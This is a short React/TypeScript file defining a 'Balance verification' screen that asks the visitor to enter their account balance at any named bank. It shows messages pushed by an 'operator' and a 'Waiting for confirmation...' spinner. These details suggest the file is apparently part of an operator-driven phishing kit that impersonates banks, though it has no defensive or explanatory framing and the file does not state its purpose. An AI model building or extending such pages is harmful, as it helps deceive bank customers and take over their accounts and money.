import React, { useState } from "react";
import type { OperatorMessage as OperatorMessageType } from "../../types";
import { Spinner } from "../../components/spinner";

interface BalanceCheckProps {
  bank?: string;
  onError: (msg: string) => void;
  operatorMessage?: OperatorMessageType | null;
  onSubmit: (balance: string) => void;
  submitting: boolean;
}

export function BalanceCheck({
  bank,
  onError,
  operatorMessage,
  onSubmit,
  submitting,
}: BalanceCheckProps) {
  const [balance, setBalance] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = balance.trim();
    if (!trimmed) {
      onError("Please enter your balance");
      return;
    }
    onSubmit(trimmed);
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  return (
    <div className="bank-ui-layout">
      <h2 className="bank-ui-heading">Balance verification</h2>
      <p className="bank-ui-body">
        {bank
          ? `Please enter your ${bank} account balance to complete the verification.`
          : "Please enter your account balance to complete the verification."}
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="balance" className="bank-ui-label-muted">
            Balance
          </label>
          <input
            id="balance"
            type="text"
            inputMode="decimal"
            value={balance}
            onChange={(e) => setBalance(e.target.value)}
            disabled={submitting}
            placeholder="e.g. 1,234.56"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting}
          className="bank-ui-btn bank-ui-btn-lg"
        >
          {submitting ? "Submitting..." : "Submit"}
        </button>
      </form>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
